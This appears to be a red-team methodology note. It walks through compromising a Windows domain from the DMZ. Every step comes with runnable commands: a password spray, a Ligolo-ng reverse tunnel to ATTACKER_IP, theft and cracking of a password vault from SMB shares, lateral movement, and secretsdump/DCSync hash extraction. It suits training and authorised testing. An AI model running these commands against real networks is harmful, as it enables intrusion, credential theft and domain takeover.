# Attack Chain: DMZ Foothold -> Network Pivot -> Credential Harvesting -> Domain Compromise

**Primary Goal:** Establish an initial foothold in the DMZ, deploy a network pivot, harvest internal credential artifacts, and iteratively escalate privileges to achieve full Domain Controller compromise via DCSync.

**TL;DR:** This methodology outlines the process of moving from an external or DMZ perspective into the internal corporate network. It involves password spraying for initial access, utilizing Ligolo-ng for network pivoting, discovering and cracking offline password vaults (.psafe3), and leveraging those credentials for lateral movement to ultimately extract the Domain Administrator's NT hash.

## High-Level Attack Flow

1. Generate username candidates and execute a password spray against DMZ services (SSH/SMB) to identify weak credentials.
2. Utilize valid credentials to access a DMZ host and deploy a network pivot (Ligolo-ng).
3. Route attacker traffic through the pivot into the internal network range (e.g., `172.16.119.0/24`).
4. Enumerate internal SMB shares and harvest sensitive artifacts, specifically Password Safe (`.psafe3`) files.
5. Perform offline password cracking against the extracted artifacts using `hashcat` to recover plaintext credentials.
6. Authenticate to internal jump hosts using the newly discovered credentials.
7. Execute credential dumping techniques (LSASS extraction or remote SecretsDump) to obtain highly privileged NT hashes.
8. Perform a DCSync attack to dump the Domain Controller and verify full domain compromise.

### Step 1: Username Generation and Password Spraying

Begin by attempting to access externally facing or DMZ services. Using a compiled list of potential usernames, perform a password spray to identify weak or default credentials.

```
# SSH password spray using Hydra
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 8

# SMB/RPC password spray using NetExec (formerly CrackMapExec)
nxc smb 172.16.119.0/24 -u users.txt -p 'Password1' --continue-on-success
```

### Step 2: Establish an Internal Pivot (Ligolo-ng)

Once initial access is achieved on a DMZ host, deploy Ligolo-ng to create a stable, reverse TCP tunnel. This allows you to interact with the internal network as if you were directly attached to it.

```
# On the attacker machine (Start the server and create a listening interface)
ligolo-ng -listen 0.0.0.0:9001 -proto tcp -server

# On the compromised DMZ host (Connect back to the attacker)
./ligolo-ng -client -remote ATTACKER_IP:9001 -proto tcp
```

### Step 3: Internal Enumeration and Artifact Harvesting

With the pivot established, enumerate internal services. Search for poorly secured SMB shares that may contain backup files, configuration scripts, or password vaults.

```
# Use smbmap to list accessible shares and permissions
smbmap -H 172.16.119.10 -u hwilliam -p 'password'

# Use smbclient to connect to a specific share and download sensitive files
smbclient -U 'NEXURA\hwilliam' '\\172.16.119.10\HR' -c 'cd Archive; get Employee-Passwords_OLD.psafe3'
```

### Step 4: Offline Password Cracking

If encrypted password vaults (like Password Safe v3 files) are discovered, extract them to the attacker machine and crack them offline to recover the plaintext credentials without generating network noise.

```
# Crack Password Safe v3 (.psafe3) using Hashcat (Mode 5200)
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz --force
```

### Step 5: Lateral Movement

Utilize the newly cracked credentials to move laterally deeper into the network, targeting internal jump hosts, management servers, or administrative workstations.

```
# Lateral movement via Remote Desktop Protocol (RDP)
xfreerdp /v:JUMP01 /u:administrator /p:'P@ssw0rd'

# Lateral movement via Windows Remote Management (WinRM)
evil-winrm -i JUMP01 -u Administrator -p 'P@ssw0rd'
```

### Step 6: Credential Dumping and Domain Compromise

Once administrative access is obtained on an internal system, attempt to dump credentials from memory (LSASS) or the local SAM database.

If the compromised account possesses the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` privileges (standard for Domain Admins), execute a DCSync attack to simulate a Domain Controller and request the NT hashes of any domain user, including the default Administrator.

```
# Remote credential dumping against a specific host
impacket-secretsdump -outputfile creds 'DOMAIN/Administrator:P@ssw0rd'@JUMP01.domain.local

# DCSync attack against the Domain Controller to extract the Administrator hash
impacket-secretsdump -just-dc-user Administrator 'DOMAIN/Administrator:P@ssw0rd'@dc01.domain.local
```

## Operational Security (OPSEC) Considerations & Cleanup

### Red Flags to Watch For

- **Password Safes in Public Shares:** The presence of `.psafe3`, `.kdbx` (KeePass), or plaintext password lists in accessible folders is a critical misconfiguration.
- **Credential Reuse:** Using the same administrative credentials across the DMZ and internal enclaves allows for rapid lateral movement.
- **Defensive Tooling:** Be aware that pivoting tools and LSASS dumping techniques are highly scrutinized by modern Endpoint Detection and Response (EDR) agents.

### Cleanup Procedures

- Remove Ligolo-ng client binaries and any staged payloads from the DMZ host.
- Clear temporary directories (e.g., `C:\Temp`, `/tmp/`) of downloaded tools or output files.
- Remove any persistence mechanisms or scheduled tasks created during the engagement.
- In a lab environment, revert to a clean snapshot. In live engagements, document all actions thoroughly and adhere strictly to the Rules of Engagement (RoE) regarding artifact removal.
